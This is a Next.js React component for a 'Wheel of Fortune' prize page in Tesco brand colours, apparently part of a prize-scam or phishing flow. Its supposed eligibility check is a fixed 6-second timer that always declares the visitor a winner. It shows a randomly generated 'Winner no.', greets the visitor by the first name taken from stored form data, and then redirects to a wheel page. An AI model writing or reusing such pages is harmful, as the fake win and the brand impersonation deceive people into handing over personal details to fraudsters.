"use client";

import confetti from "canvas-confetti";
import { useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";

type Props = {
  sessionId: string;
  routeSessionId?: string;
};

type Phase = "loading" | "checking" | "success" | "error";

const TESCO_BLUE = "#00539F";
const TESCO_RED = "#EE1C2E";
const LUX_BLUE = "#4D9DE0";
const LUX_BLUE_LIGHT = "#BFD9F2";
const LUX_WHITE = "#FFFFFF";

const CONFETTI_COLORS = [TESCO_BLUE, TESCO_RED, LUX_BLUE, LUX_WHITE];
const BLUE_COLORS = [LUX_BLUE, LUX_BLUE_LIGHT, LUX_WHITE];

const CHECK_MS = 6000;
const SUCCESS_MIN_MS = 5000;
const SUCCESS_MAX_MS = 6000;

function fireLuxuryConfetti() {
  const base = {
    ticks: 300,
    gravity: 0.85,
    disableForReducedMotion: true,
  };

  // Wave 1 — merkez mega patlama + iki yandan top atisi
  void confetti({
    ...base,
    colors: CONFETTI_COLORS,
    particleCount: 200,
    spread: 120,
    startVelocity: 52,
    scalar: 1.1,
    origin: { x: 0.5, y: 0.6 },
  });
  void confetti({
    ...base,
    colors: [TESCO_BLUE, TESCO_RED, LUX_WHITE],
    particleCount: 100,
    angle: 58,
    spread: 60,
    startVelocity: 62,
    scalar: 0.95,
    origin: { x: 0, y: 0.78 },
  });
  void confetti({
    ...base,
    colors: [TESCO_BLUE, TESCO_RED, LUX_WHITE],
    particleCount: 100,
    angle: 122,
    spread: 60,
    startVelocity: 62,
    scalar: 0.95,
    origin: { x: 1, y: 0.78 },
  });

  // Wave 2 — altin yagmuru: ustten yavas suzulen kagit parcalari
  window.setTimeout(() => {
    void confetti({
      ...base,
      colors: BLUE_COLORS,
      particleCount: 130,
      spread: 170,
      startVelocity: 26,
      gravity: 0.55,
      decay: 0.94,
      drift: 0.5,
      ticks: 420,
      scalar: 0.85,
      origin: { x: 0.5, y: 0.2 },
    });
    void confetti({
      ...base,
      colors: BLUE_COLORS,
      particleCount: 60,
      spread: 90,
      startVelocity: 22,
      gravity: 0.5,
      decay: 0.93,
      drift: -0.5,
      ticks: 420,
      scalar: 1.3,
      origin: { x: 0.15, y: 0.25 },
    });
    void confetti({
      ...base,
      colors: BLUE_COLORS,
      particleCount: 60,
      spread: 90,
      startVelocity: 22,
      gravity: 0.5,
      decay: 0.93,
      drift: 0.6,
      ticks: 420,
      scalar: 1.3,
      origin: { x: 0.85, y: 0.25 },
    });
  }, 400);

  // Wave 3 — kose fiskiyeleri ikinci tur
  window.setTimeout(() => {
    void confetti({
      ...base,
      colors: CONFETTI_COLORS,
      particleCount: 70,
      angle: 55,
      spread: 75,
      startVelocity: 56,
      scalar: 0.9,
      origin: { x: 0, y: 0.95 },
    });
    void confetti({
      ...base,
      colors: CONFETTI_COLORS,
      particleCount: 70,
      angle: 125,
      spread: 75,
      startVelocity: 56,
      scalar: 0.9,
      origin: { x: 1, y: 0.95 },
    });
  }, 850);

  // Wave 4 — final: ince altin serpinti
  window.setTimeout(() => {
    void confetti({
      ...base,
      colors: BLUE_COLORS,
      particleCount: 90,
      spread: 140,
      startVelocity: 30,
      gravity: 0.6,
      decay: 0.95,
      drift: 0.3,
      ticks: 460,
      scalar: 0.65,
      origin: { x: 0.5, y: 0.35 },
    });
  }, 1300);
}

export function VerifyClient({ sessionId, routeSessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [phase, setPhase] = useState<Phase>("loading");
  const [firstName, setFirstName] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [winnerNo] = useState(() => 20 + Math.floor(Math.random() * 980));
  const timersRef = useRef<number[]>([]);

  const effectiveRouteSessionId = routeSessionId ?? sessionId;

  useEffect(() => {
    const timers = timersRef.current;
    return () => {
      timers.forEach((t) => window.clearTimeout(t));
    };
  }, []);

  useEffect(() => {
    let cancelled = false;
    if (!supabase || !sessionId) {
      setPhase("checking");
      return;
    }
    void (async () => {
      const { data } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (cancelled) return;
      const name = data?.form_data?.firstName;
      if (typeof name === "string" && name.trim()) {
        setFirstName(name.trim());
      }
      setPhase("checking");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  useEffect(() => {
    if (phase !== "checking") return;

    timersRef.current.push(
      window.setTimeout(() => {
        setPhase("success");
      }, CHECK_MS),
    );
  }, [phase]);

  useEffect(() => {
    if (phase !== "success") return;

    fireLuxuryConfetti();

    const redirectMs =
      SUCCESS_MIN_MS + Math.random() * (SUCCESS_MAX_MS - SUCCESS_MIN_MS);
    timersRef.current.push(
      window.setTimeout(() => {
        const go = async () => {
          try {
            if (supabase && sessionId) {
              await supabase
                .from("sessions")
                .update({ current_step: "wheel" })
                .eq("id", sessionId);
            }
          } catch {
            /* best-effort; navigation proceeds anyway */
          }
          router.push(
            `/wheel?session=${encodeURIComponent(effectiveRouteSessionId)}`,
          );
        };
        void go();
      }, redirectMs),
    );
  }, [phase, router, sessionId, supabase, effectiveRouteSessionId]);

  if (error) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center p-4">
        <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-900">
          {error}
        </p>
      </div>
    );
  }

  return (
    <div className="relative flex min-h-[100dvh] items-center justify-center overflow-hidden p-4">
      {phase !== "success" ? (
        <div className="w-full max-w-[480px] rounded-[24px] border border-[#dbe6f3] bg-white/95 px-6 py-10 text-center shadow-[0_20px_60px_rgba(10,36,99,0.15)] sm:px-10">
          <div className="mx-auto mb-6 flex h-16 w-16 items-center justify-center">
            <div className="h-14 w-14 animate-spin rounded-full border-4 border-[#dbe6f3] border-t-[#4d9de0]" />
          </div>
          <h1 className="text-xl font-extrabold text-[#0a2463] sm:text-2xl">
            Please wait...
          </h1>
          <p className="mt-3 text-sm font-medium leading-relaxed text-slate-300 sm:text-[15px]">
            Checking if you have won the right to spin the Wheel of Fortune.
            <br />
            The result will be announced within a few seconds.
          </p>
          <div className="mx-auto mt-6 h-1.5 w-56 max-w-full overflow-hidden rounded-full bg-[#e6eef7]">
            <div
              className="h-full w-1/3 rounded-full bg-gradient-to-r from-[var(--brand)] via-[#4d9de0] to-[var(--brand)]"
              style={{ animation: "verifySlide 1.6s ease-in-out infinite" }}
            />
          </div>
          <style jsx>{`
            @keyframes verifySlide {
              0% {
                transform: translateX(-120%);
              }
              100% {
                transform: translateX(400%);
              }
            }
          `}</style>
        </div>
      ) : (
        <div className="w-full max-w-[480px] animate-in zoom-in-95 duration-500 rounded-[24px] border border-[#ee1c2e]/40 bg-white/95 px-6 py-10 text-center shadow-[0_20px_60px_rgba(10,36,99,0.15)] sm:px-10">
          <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-gradient-to-br from-[#ee1c2e] to-[#b30f1e] shadow-[0_0_30px_rgba(238,28,46,0.6)]">
            <svg
              className="h-9 w-9 text-[#0a2463]"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
              strokeWidth={3}
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M5 13l4 4L19 7"
              />
            </svg>
          </div>
          <p className="text-sm font-semibold uppercase tracking-widest text-[#ff6b78]">
            Congratulations{firstName ? `,` : ""}
          </p>
          {firstName ? (
            <h1 className="mt-1 break-words text-3xl font-black text-[#0a2463] sm:text-4xl">
              {firstName}!
            </h1>
          ) : (
            <h1 className="mt-1 text-3xl font-black text-[#0a2463] sm:text-4xl">
              Congratulations!
            </h1>
          )}
          <div className="mx-auto mt-4 inline-flex items-center gap-2 rounded-full border border-[#ee1c2e]/40 bg-[#ee1c2e]/5 px-4 py-1.5">
            <svg
              className="h-4 w-4 text-[#ff6b78]"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path d="M10 1.5l2.6 5.3 5.9.9-4.3 4.1 1 5.8L10 14.9l-5.2 2.7 1-5.8L1.5 7.7l5.9-.9L10 1.5z" />
            </svg>
            <span className="text-sm font-bold text-[#ff6b78]">
              Winner no. {winnerNo}
            </span>
          </div>
          <p className="mt-4 text-sm font-medium leading-relaxed text-slate-200 sm:text-base">
            You have won the right to spin the Wheel of Fortune!
          </p>
          <div className="mt-6 flex items-center justify-center gap-2 text-xs text-slate-400">
            <div className="h-4 w-4 animate-spin rounded-full border-2 border-slate-500 border-t-[#4d9de0]" />
            Redirecting to the Wheel of Fortune...
          </div>
        </div>
      )}
    </div>
  );
}
